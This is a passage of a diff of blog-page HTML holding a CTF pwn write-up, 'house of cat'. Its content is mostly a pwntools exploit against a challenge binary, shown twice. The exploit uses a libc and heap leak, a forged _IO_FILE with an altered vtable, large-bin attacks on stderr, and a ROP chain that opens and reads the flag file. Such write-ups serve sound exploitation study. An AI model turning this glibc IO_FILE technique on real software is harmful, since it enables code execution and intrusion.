class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-string">&quot;heapbase--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heapbase))<br><span class="hljs-comment"># p()</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span> <span class="hljs-comment">#: pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x000000000011f497</span> <span class="hljs-comment">#: pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span> <span class="hljs-comment">#: pop rax ; ret</span><br>ret=libc_base+<span class="hljs-number">0x0000000000029cd6</span><br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>close=libc_base+libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>read=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>syscallret=libc_base+libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)).__next__()<br>success(<span class="hljs-string">&#x27;syscall_ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(syscallret))<br><br><span class="hljs-comment">#fake IO</span><br>ioaddr=heapbase+<span class="hljs-number">0xb00</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xc18</span>-<span class="hljs-number">0x68</span>)<span class="hljs-comment">#rdx</span><br>fake_IO_FILE +=p64(setcontext+<span class="hljs-number">61</span>)<span class="hljs-comment">#call addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x200</span>)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xb30</span>) <span class="hljs-comment">#rax1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode = 1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+<span class="hljs-number">0x2160d0</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0xb30</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># rax2</span><br>flagaddr=heapbase+<span class="hljs-number">0x17d0</span><br>payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heapbase+<span class="hljs-number">0x2050</span>)+p64(ret)<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x418</span>,payload1)<br>delete(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># p()</span><br><span class="hljs-comment">#large bin attack stderr poiniter</span><br>edit(<span class="hljs-number">0</span>,p64(libc_base+<span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x290</span>)+p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;aaaaa&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;eee&#x27;</span>)<br><br><span class="hljs-comment">#rop</span><br>payload=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(close)\<br>    +p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscallret)\<br>        +p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read)\<br>            +p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,payload)<br>delete(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x450</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>))<br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-comment"># p()</span><br><br>edit(<span class="hljs-number">5</span>,p64(libc_base+<span class="hljs-number">0x21a0e0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x1370</span>)+p64(heapbase+<span class="hljs-number">0x28e0</span>-<span class="hljs-number">0x20</span>+<span class="hljs-number">3</span>))<br><span class="hljs-comment">#trigger __malloc_assert</span><br>io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br><span class="hljs-comment">#gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span><br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x450</span>))  <span class="hljs-comment"># add(11,0X450)</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./houseofcat&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;210.30.97.133&#x27;,28065)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>():</span><br><span class="line">    gdb.attach(proc.pidof(io)[<span class="number">0</span>],<span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    payload = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">    io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,payload)</span><br><span class="line">    <span class="comment"># payload = &quot;CAT | r00t QWB QWXF\xFF\xFF\xFF\xFF&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,cont</span>):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;plz input your content:\n&#x27;</span>,cont)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cont</span>):</span><br><span class="line">    io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;plz input your content:\n&#x27;</span>, cont)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"><span class="comment"># p()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x430</span>,<span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>,<span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line"><span class="comment"># p()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">io.recv(<span class="number">10</span>)</span><br><span class="line">heapbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">success(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;heapbase--&gt;&quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"><span class="comment"># p()</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002be51</span> <span class="comment">#: pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x000000000011f497</span> <span class="comment">#: pop rdx ; pop r12 ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x0000000000045eb0</span> <span class="comment">#: pop rax ; ret</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000029cd6</span></span><br><span class="line">stderr=libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">close=libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscallret=libc_base+libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)).__next__()</span><br><span class="line">success(<span class="string">&#x27;syscall_ret--&gt;&#x27;</span>+<span class="built_in">hex</span>(syscallret))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake IO</span></span><br><span class="line">ioaddr=heapbase+<span class="number">0xb00</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+<span class="number">0xc18</span>-<span class="number">0x68</span>)<span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+<span class="number">0xb30</span>) <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)  <span class="comment"># _mode = 1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br><span class="line">flagaddr=heapbase+<span class="number">0x17d0</span></span><br><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heapbase+<span class="number">0x2050</span>)+p64(ret)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x418</span>,payload1)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># p()</span></span><br><span class="line"><span class="comment">#large bin attack stderr poiniter</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heapbase+<span class="number">0x290</span>)+p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>,<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)\</span><br><span class="line">    +p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscallret)\</span><br><span class="line">        +p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read)\</span><br><span class="line">            +p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x430</span>,payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x450</span>,p64(<span class="number">0</span>)+p64(<span class="number">1</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># p()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heapbase+<span class="number">0x1370</span>)+p64(heapbase+<span class="number">0x28e0</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br><span class="line"><span class="comment">#trigger __malloc_assert</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;plz input your cat idx:&#x27;</span>,<span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;plz input your cat size:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x450</span>))  <span class="comment"># add(11,0X450)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【IO_FILE】house of cat</div>
-      <div>http://loora1n.github.io/2022/11/13/【IO_FILE】house of cat/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年11月13日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
       
     </div>
-    <div class="license-icon iconfont"></div>
+
   </div>
 
+  <div class="article-footer">
+    <div class="article-meta pull-left">
 
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/" title="【IO_FILE】FSOP">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【IO_FILE】FSOP</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/11/08/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V2/" title="【CTFd 二次开发】解题播报机器人 V2">
-                        <span class="hidden-mobile">【CTFd 二次开发】解题播报机器人 V2</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  <article id="comments">
     
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
 
-
-  </article>
-
-
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
+    
 
     </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2023 Loora1N
+    
+  </p>
+</footer>
+    
+    
   </div>
 </div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-  <span id="timeDate">载入天数...</span>
-  <span id="times">载入时分秒...</span>
-  <script>
-  var now = new Date();
-  function createtime(){
-      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
-      now.setTime(now.getTime()+250);
-      days = (now - grt ) / 1000 / 60 / 60 / 24;
-      dnum = Math.floor(days);
-      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
-      hnum = Math.floor(hours);
-      if(String(hnum).length ==1 ){
-          hnum = "0" + hnum;
-      }
-      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
-      mnum = Math.floor(minutes);
-      if(String(mnum).length ==1 ){
-                mnum = "0" + mnum;
-      }
-      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
-      snum = Math.round(seconds);
-      if(String(snum).length ==1 ){
-                snum = "0" + snum;
-      }
-      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
-      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
-  }  //此次自定义显示内容
-  setInterval("createtime()",250);
-  </script>   
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
